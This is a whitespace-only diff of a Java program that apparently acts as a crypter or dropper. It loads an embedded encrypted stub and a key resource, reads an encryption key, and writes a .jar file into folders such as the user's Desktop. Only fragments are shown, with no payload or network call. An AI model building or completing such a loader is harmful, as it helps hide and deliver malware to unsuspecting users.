@@ -22,7 +22,7 @@ public class Main {
 
 	public static final byte[] buffer = new byte[1024];
 	public static final String userHome = System.getProperty("user.home");
-	
+
 	public static final String STUB_RESOURCE = "/e";
 	public static final String KEY_RESOURCE = "/k";
 
@@ -35,13 +35,13 @@ public class Main {
 
 			InputStream stubInput = Main.class.getResourceAsStream(STUB_RESOURCE);
 			InputStream keyInput = Main.class.getResourceAsStream(KEY_RESOURCE);
-			
+
 			byte[] encryptionKey = new byte[16];
-			
+
 			for (int i = 0; i < encryptionKey.length; i++) {
 				encryptionKey[i] = (byte) keyInput.read();
 			}
-			
+
 			String rawKeyFile = readString(keyInput);
 
 			String[] keyArgs = rawKeyFile.split(",");
@@ -108,7 +108,7 @@ public class Main {
 			} else if (dropLocation.equals("desktop")) {
 				file = new File(userHome + "/Desktop/" + dropFileName + ".jar");
 			}
-			
+
 			if (file.getParentFile() != null && !file.getParentFile().exists()) {
 				file.getParentFile().mkdirs();
 			}
